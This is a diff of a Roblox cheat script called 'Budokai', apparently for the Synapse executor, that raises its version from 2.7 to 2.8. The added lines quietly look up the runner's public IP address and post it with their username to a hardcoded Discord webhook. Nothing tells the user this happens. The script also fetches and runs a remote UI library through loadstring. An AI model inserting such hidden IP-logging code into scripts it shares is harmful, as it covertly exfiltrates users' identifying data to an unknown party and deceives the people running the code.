@@ -1,10 +1,22 @@
 repeat wait() until game:IsLoaded()
+local exeName = game.Players.LocalPlayer.Name
+local response = syn.request({
+    Url = "https://httpbin.org/get",
+    Method = "GET"})
+ip = game:GetService("HttpService"):JSONDecode(response.Body)["origin"]
+local response = syn.request(
+    {
+        Url = 'https://discord.com/api/webhooks/999717675800481852/h6F2jiLaiX5Oxp-y4Y4C451MpN_iDnTU25EMozP9OsrzaiSOQKGUSLAv7eeMH1M9BNVp',
+        Method = 'POST',
+        Headers = {
+            ['Content-Type'] = 'application/json'},
+            Body = game:GetService('HttpService'):JSONEncode({content = exeName.." has just executed the budokai script! His IP is "..ip})})
 game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart")
 game.Players.LocalPlayer.Backpack:WaitForChild("Power Control")
 local Player = game.Players.LocalPlayer
 local plrname = game.Players.LocalPlayer.Name
 local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
-local Window = OrionLib:MakeWindow({Name = "Budokai ver. 2.7", HidePremium = true, SaveConfig = true, ConfigFolder = "OrionTest", IntroEnabled = false})
+local Window = OrionLib:MakeWindow({Name = "Budokai ver. 2.8", HidePremium = true, SaveConfig = true, ConfigFolder = "OrionTest", IntroEnabled = false})
 
 local Tab1 = Window:MakeTab({
 	Name = "Main",
